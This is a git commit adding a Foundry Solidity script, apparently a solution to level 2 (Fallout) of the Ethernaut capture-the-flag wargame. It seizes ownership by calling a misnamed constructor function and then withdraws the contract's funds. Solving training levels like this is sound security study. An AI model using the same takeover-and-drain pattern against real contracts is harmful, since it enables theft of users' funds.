40fd1c63552d3dcb7a7639f0a5b1c0ee2bec396d
beeb <703631+beeb@users.noreply.github.com>
2023-09-01 14:04:43 +0200

    level 2

---
+++ script/Level02.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+import { Script, console2 } from "forge-std/Script.sol";
+import { Vm } from "forge-std/Vm.sol";
+import { Ethernaut } from "../interfaces/IEthernaut.sol";
+import { Fallout } from "../src/Level02.sol";
+
+contract Attack is Script {
+    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
+    Fallout instance;
+
+    function run() public {
+        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
+        vm.startBroadcast(deployerPrivateKey);
+        vm.recordLogs();
+        ethernaut.createLevelInstance(0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639);
+        Vm.Log[] memory entries = vm.getRecordedLogs();
+        address payable instanceAddress = payable(address(uint160(uint256(entries[0].topics[2]))));
+        console2.log(instanceAddress);
+        instance = Fallout(instanceAddress);
+
+        instance.Fal1out();
+        instance.collectAllocations();
+
+        ethernaut.submitLevelInstance(instanceAddress);
+        vm.stopBroadcast();
+    }
+}
